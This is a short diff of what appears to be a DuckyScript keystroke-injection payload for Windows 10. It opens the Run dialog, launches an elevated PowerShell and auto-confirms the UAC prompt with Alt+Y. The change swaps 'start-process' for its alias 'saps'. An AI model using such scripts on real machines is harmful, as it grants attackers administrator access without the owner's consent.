@@ -7,7 +7,7 @@ REM     Target: Windows 10
 DELAY 2000
 GUI r 
 DELAY 1000
-STRINGLN powershell start-process powershell -verb runas
+STRINGLN powershell saps powershell -verb runas
 DELAY 1000
 ALT y
 DELAY 1000
